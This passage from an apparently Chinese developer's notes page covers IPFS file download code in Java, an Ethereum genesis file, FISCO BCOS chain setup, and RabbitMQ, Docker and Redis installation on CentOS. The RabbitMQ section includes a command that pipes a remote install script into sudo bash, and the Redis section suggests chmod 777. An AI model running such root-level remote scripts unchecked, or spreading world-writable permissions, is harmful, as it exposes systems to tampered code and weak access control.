<span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            data <span class=\"token operator\">=</span> ipfs<span class=\"token punctuation\">.</span><span class=\"token function\">cat</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Multihash</span><span class=\"token punctuation\">.</span><span class=\"token function\">fromBase58</span><span class=\"token punctuation\">(</span>hash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">return</span> data<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre> </pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">downFromIpfs</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> hash<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> destFile<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> data <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            data <span class=\"token operator\">=</span> ipfs<span class=\"token punctuation\">.</span><span class=\"token function\">cat</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Multihash</span><span class=\"token punctuation\">.</span><span class=\"token function\">fromBase58</span><span class=\"token punctuation\">(</span>hash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>data <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">&amp;&amp;</span> data<span class=\"token punctuation\">.</span>length <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            <span class=\"token class-name\">File</span> file <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span>destFile<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>                file<span class=\"token punctuation\">.</span><span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            <span class=\"token class-name\">FileOutputStream</span> fos <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>            <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>                fos <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FileOutputStream</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>                fos<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>                fos<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>                e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">finally</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>                <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>                    fos<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>                    e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre> </pre></td></tr><tr><td data-num=\"68\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>测试接口返回 hash</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240123223750631.png\" alt=\"image-20240123223750631\" /></p>\n<p>成功上传到 IPFS 部署地址</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240123223838553.png\" alt=\"image-20240123223838553\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21lbmdsdXpodS9hcnRpY2xlL2RldGFpbHMvMTA4MzM0NDM3\">使用 IPFS 作为 Java 项目的文件系统_java-ipfs-http-client-CSDN 博客</span></p>\n<p>后面接口看自己发挥咯</p>\n<p>比如我设计的数据库长这样</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240124141318889.png\" alt=\"image-20240124141318889\" /></p>\n<h1 id=\"以太坊区块链网络\"><a class=\"anchor\" href=\"#以太坊区块链网络\">#</a> 以太坊区块链网络</h1>\n<p>genesis.json</p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token property\">\"config\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token property\">\"chainId\"</span><span class=\"token operator\">:</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token property\">\"homesteadBlock\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token property\">\"eip150Block\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token property\">\"eip155Block\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token property\">\"eip158Block\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token property\">\"byzantiumBlock\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token property\">\"constantinopleBlock\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token property\">\"petersburgBlock\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token property\">\"ethash\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token property\">\"difficulty\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token property\">\"gasLimit\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"8000000\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token property\">\"alloc\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token property\">\"7df9a875a174b3bc565e6424a0050ebc1b2d1d82\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token property\">\"balance\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"300000\"</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token property\">\"f41c74c9ae680c1aa78f42e5647a62f353b7bdde\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token property\">\"balance\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"400000\"</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"fisco区块链网络\"><a class=\"anchor\" href=\"#fisco区块链网络\">#</a> FISCO 区块链网络</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1Y2hfaG9uZy9hcnRpY2xlL2RldGFpbHMvMTE1NTI0NTQ4\">基于 FiscoBcos 的 java-sdk 实现区块链服务_bcossdk-CSDN 博客</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9maXNjby1iY29zLWRvY3VtZW50YXRpb24ucmVhZHRoZWRvY3MuaW8vemgtY24vbGF0ZXN0L2RvY3MvdHV0b3JpYWwvc2RrX2FwcGxpY2F0aW9uLmh0bWw=\">开发第一个区块链应用 — FISCO BCOS 2.0 v2.9.0 文档 (fisco-bcos-documentation.readthedocs.io)</span></p>\n<ol>\n<li>\n<p><code>sudo yum install -y openssl openssl-devel</code></p>\n</li>\n<li>\n<pre><code>## 创建操作目录\ncd ~ &amp;&amp; mkdir -p fisco &amp;&amp; cd fisco\n\n## 下载脚本\ncurl -#LO https://github.com/FISCO-BCOS/FISCO-BCOS/releases/download/v2.9.1/build_chain.sh &amp;&amp; chmod u+x build_chain.sh\n</code></pre>\n</li>\n<li>\n<p>在 fisco 目录下执行下面的指令，生成一条单群组 4 节点的 FISCO 链。 请确保机器的 <code>30300~30303，20200~20203，8545~8548</code>  端口没有被占用。</p>\n<pre><code>bash build_chain.sh -l 127.0.0.1:4 -p 30300,20200,8545\n</code></pre>\n<p>命令执行成功会输出 <code>All completed</code></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240201171015734.png\" alt=\"image-20240201171015734\" /></p>\n</li>\n<li>\n<p>启动所有节点 <code>bash nodes/127.0.0.1/start_all.sh</code></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240201171302104.png\" alt=\"image-20240201171302104\" /></p>\n</li>\n<li>\n<p>检查进程是否启动 <code>ps -ef | grep -v grep | grep fisco-bcos</code></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240201171213881.png\" alt=\"image-20240201171213881\" /></p>\n</li>\n<li>\n<p>查看节点 node0 连接的节点数 <code>tail -f nodes/127.0.0.1/node0/log/log*  | grep connected</code></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240201171341998.png\" alt=\"image-20240201171341998\" /></p>\n</li>\n<li>\n<p>检查是否存在共识 <code>tail -f nodes/127.0.0.1/node0/log/log*  | grep +++</code></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240201171459194.png\" alt=\"image-20240201171459194\" /></p>\n</li>\n</ol>\n<h1 id=\"登录页面改写\"><a class=\"anchor\" href=\"#登录页面改写\">#</a> 登录页面改写</h1>\n<p>解决报错 25</p>\n<h1 id=\"rabbitmq\"><a class=\"anchor\" href=\"#rabbitmq\">#</a> RabbitMQ</h1>\n<p>部署在远程服务器，CentOS7</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 下载 rabbitmq-server</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">wget</span> https://github.com/rabbitmq/rabbitmq-server/releases/download/v3.8.14/rabbitmq-server-3.8.14-1.el7.noarch.rpm</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 下载安装 erlang</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-s</span> https://packagecloud.io/install/repositories/rabbitmq/erlang/script.rpm.sh <span class=\"token operator\">|</span> <span class=\"token function\">sudo</span> <span class=\"token function\">bash</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">sudo</span> yum <span class=\"token function\">install</span> erlang-23.2.7-2.el7.x86_64</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">wget</span> --content-disposition <span class=\"token string\">\"https://packagecloud.io/rabbitmq/erlang/packages/el/7/erlang-23.2.7-2.el7.x86_64.rpm/download.rpm?distro_version_id=140\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 安装 Erlang</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">rpm</span> <span class=\"token parameter variable\">-Uvh</span> erlang-23.2.7-2.el7.x86_64.rpm</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>yum <span class=\"token function\">install</span> <span class=\"token parameter variable\">-y</span> erlang</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># # 查询 erlang 在系统中安装包的名字</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>yum list <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> erlang</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># 查看 erlang 版本</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>erl <span class=\"token parameter variable\">-v</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># 安装 rabbitmq 的 socat 依赖</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>yum <span class=\"token function\">install</span> <span class=\"token parameter variable\">-y</span> socat</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">rpm</span> <span class=\"token parameter variable\">-Uvh</span> rabbitmq-server-3.8.14-1.el7.noarch.rpm</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># 安装 rabbitmq</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>yum <span class=\"token function\">install</span> rabbitmq-server <span class=\"token parameter variable\">-y</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># 启动服务</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>systemctl start rabbitmq-server</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># 查看服务状态，如图</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>systemctl status rabbitmq-server.service</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># 开机自启动</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>systemctl <span class=\"token builtin class-name\">enable</span> rabbitmq-server</pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># 停止服务</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>systemctl stop rabbitmq-server</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># 安装需要的软件包</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>yum <span class=\"token function\">install</span> <span class=\"token parameter variable\">-y</span> yum-utils device-mapper-persistent-data lvm2</pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\"># 设置 yum 源为阿里云</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># 安装 docker</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>yum <span class=\"token function\">install</span> docker-ce <span class=\"token parameter variable\">-y</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\"># 安装后查看 docker 版本</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token parameter variable\">-v</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\"># 阿里云镜像加速</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">mkdir</span> <span class=\"token parameter variable\">-p</span> /etc/docker</pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">tee</span> /etc/docker/daemon.json <span class=\"token operator\">&lt;&lt;-</span><span class=\"token string\">'EOF'</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>&#123;</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  \"registry-mirrors\": [\"https://73z5h6yb.mirror.aliyuncs.com\"]</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>EOF</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token function\">sudo</span> systemctl daemon-reload</pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token function\">sudo</span> systemctl restart <span class=\"token function\">docker</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\"># 启动 docker</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>systemctl start <span class=\"token function\">docker</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token comment\"># 查看 docker 状态</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>systemctl status <span class=\"token function\">docker</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token comment\"># 查看 docker 镜像</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token function\">docker</span> images</pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\"># 获取 rabbit 镜像</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token function\">docker</span> pull rabbitmq:management</pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\"># 创建并运行容器</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token function\">docker</span> run <span class=\"token parameter variable\">-di</span> <span class=\"token parameter variable\">--name</span><span class=\"token operator\">=</span>myrabbit <span class=\"token parameter variable\">-p</span> <span class=\"token number\">15672</span>:15672 rabbitmq:management</pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\"># 查看容器</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token function\">ps</span> <span class=\"token parameter variable\">-a</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token comment\"># 启动，最后的一串和容器中名字对应</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token function\">docker</span> start 7315406118a8</pre></td></tr></table></figure><p>宝塔面板打开 15672 端口规则， <code>http://ip:15672</code></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 添加用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>rabbitmqctl add_user 用户名 密码</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 设置用户角色，分配操作权限</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>rabbitmqctl set_user_tags 用户名 角色</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 为用户添加资源权限 (授予访问虚拟机根节点的所有权限)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>rabbitmqctl set_permissions <span class=\"token parameter variable\">-p</span> / 用户名 <span class=\"token string\">\".*\"</span> <span class=\"token string\">\".*\"</span> <span class=\"token string\">\".*\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>角色：</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>administrator：可以登录控制台、查看所有信息、并对rabbitmq进行管理</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>monToring：监控者；登录控制台，查看所有信息</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>policymaker：策略制定者；登录控制台指定策略</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>managment：普通管理员；登录控制</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># 修改密码</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>rabbitmqctl change_ password 用户名 新密码</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># 删除用户</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>rabbitmqctl delete_user 用户名</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># 查看用户清单</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>rabbitmqctl list_users</pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># 如果用户无法登录，需要进入 rabbitmq 命令行设置</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\"># 进入 rabbitmq</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token function\">docker</span> <span class=\"token builtin class-name\">exec</span> <span class=\"token parameter variable\">-it</span> myrabbit <span class=\"token function\">bash</span></pre></td></tr></table></figure><p>防火墙</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 开放端口（54321 是面板端口，12345 是后面节点要用的）</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>firewall-cmd <span class=\"token parameter variable\">--permanent</span> --add-port<span class=\"token operator\">=</span><span class=\"token number\">54321</span>/tcp --add-port<span class=\"token operator\">=</span><span class=\"token number\">12345</span>/tcp </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 查看防火墙的开放的端口</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>firewall-cmd <span class=\"token parameter variable\">--permanent</span> --list-ports</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 重启防火墙 (修改配置后要重启防火墙)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>firewall-cmd <span class=\"token parameter variable\">--reload</span></pre></td></tr></table></figure><h1 id=\"redis\"><a class=\"anchor\" href=\"#redis\">#</a> Redis</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaHVuYW56cC9wLzEyMzA0NjIyLmh0bWw=\">Linux 安装部署 Redis (超级详细) - 长沙大鹏 - 博客园 (cnblogs.com)</span></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mkdir</span> redis</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">cd</span> redis</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">wget</span> http://download.redis.io/releases/redis-5.0.7.tar.gz</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">tar</span> <span class=\"token parameter variable\">-zvxf</span> redis-5.0.7.tar.gz</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">mv</span> /home/redis/redis-5.0.7 /usr/local/redis</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin class-name\">cd</span> /usr/local/redis</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>yum <span class=\"token function\">install</span> <span class=\"token function\">make</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>yum <span class=\"token function\">install</span> gcc</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>yum <span class=\"token function\">install</span> tcl</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>yum <span class=\"token function\">install</span> build-essential</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>yum update</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">make</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># 编译报错处理</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">make</span> lua jemalloc linenoise</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># 安装</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">make</span> <span class=\"token assign-left variable\">PREFIX</span><span class=\"token operator\">=</span>/usr/local/redis <span class=\"token function\">install</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># 启动</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>./bin/redis-server<span class=\"token operator\">&amp;</span> ./redis.conf</pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># 启动报错可以全删从头再来</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token function\">chmod</span> +x  redis  或者  <span class=\"token function\">chmod</span> <span class=\"token number\">777</span> redis</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># command not found</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token function\">cp</span> <span class=\"token parameter variable\">-r</span> 